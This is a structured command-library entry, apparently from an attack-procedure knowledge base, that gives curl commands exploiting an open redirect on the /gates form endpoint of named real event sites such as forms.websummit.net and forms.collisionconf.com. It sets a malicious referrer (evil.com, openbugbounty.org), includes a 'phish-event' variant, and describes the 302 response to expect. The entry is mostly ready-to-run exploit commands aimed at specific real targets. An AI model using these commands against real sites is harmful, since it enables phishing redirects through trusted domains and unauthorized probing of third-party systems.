---
id: cmd-uuid-456
data: >-
  curl -X POST 'https://forms.websummit.net/gates' -H 'Content-Type:
  application/x-www-form-urlencoded' -d
  'phone_number=1234567890&full_number=%2B11234567890&referrer=http://openbugbounty.org&slug=test-event'
  -v
tags:
  - web
  - exploit
  - redirect
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:23.482Z'
verified: false
validated: true
submitted: true
---
# curl-post-malicious-referrer

## Command

```bash
curl -X POST 'https://forms.websummit.net/gates' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'phone_number=1234567890&full_number=%2B11234567890&referrer=http://openbugbounty.org&slug=test-event' \
  -v
```

## Description

This command exploits an open redirect by submitting a POST request to the /gates endpoint with a malicious referrer URL, triggering a redirect to an external site after form processing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method as POST | Yes |
| `'https://forms.websummit.net/gates'` | Target endpoint URL (adapt for other domains like forms.moneyconf.com) | Yes |
| `-H 'Content-Type: application/x-www-form-urlencoded'` | Sets the content type for form data | Yes |
| `-d '...'` | Form data including phone_number, full_number, referrer (malicious URL), and slug | Yes |
| `-v` | Verbose mode to show headers and redirect details | No |

## Examples

### Basic Usage

```bash
curl -X POST 'https://forms.websummit.net/gates' -d 'referrer=http://evil.com' -v
```

### Advanced Usage

```bash
curl -X POST 'https://forms.collisionconf.com/gates' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'phone_number=9876543210&full_number=%2B19876543210&referrer=http://openbugbounty.org&slug=phish-event' \
  -v --location
```

## Expected Output

Verbose output showing HTTP request/response, including a 302 status code with Location header pointing to the malicious referrer URL, e.g., < Location: http://openbugbounty.org >.

## Related

- [[Related Procedure: Exploit Open Redirect in /gates Endpoint]]
